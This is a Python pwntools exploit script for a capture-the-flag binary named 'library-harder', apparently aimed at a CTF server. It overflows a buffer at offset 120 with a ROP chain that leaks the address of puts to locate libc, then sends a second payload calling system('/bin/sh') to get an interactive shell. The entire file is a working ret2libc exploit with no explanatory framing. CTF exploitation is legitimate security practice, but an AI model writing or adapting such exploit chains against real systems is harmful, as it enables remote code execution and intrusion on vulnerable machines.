#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/library-harder'

e = ELF('./build/library-harder')
rop = ROP('./build/library-harder')
libc = ELF('/usr/lib/libc.so.6')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5680)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/library-harder', cwd='problemDir')
else:
    p = e.process()

payload = flat({120: rop.find_gadget(['pop rdi','ret'])[0]},e.got['puts'],e.sym['puts'],e.sym['main'])

p.sendline(payload)
p.recvline()
dat = p.recvline()[:-1] #remove newline
puts = u64(dat.ljust(8, b"\x00"))
libc.address = puts - libc.sym['puts']
#print(hex(puts))
#print(hex(libc.address))
#print(hex(libc.sym['system']))
#print(hex(next(libc.search(b"/bin/sh"))))

payload = flat({120: rop.find_gadget(['pop rdi','ret'])[0]}, next(libc.search(b"/bin/sh")),libc.sym['system'])
p.sendline(payload)
p.interactive()
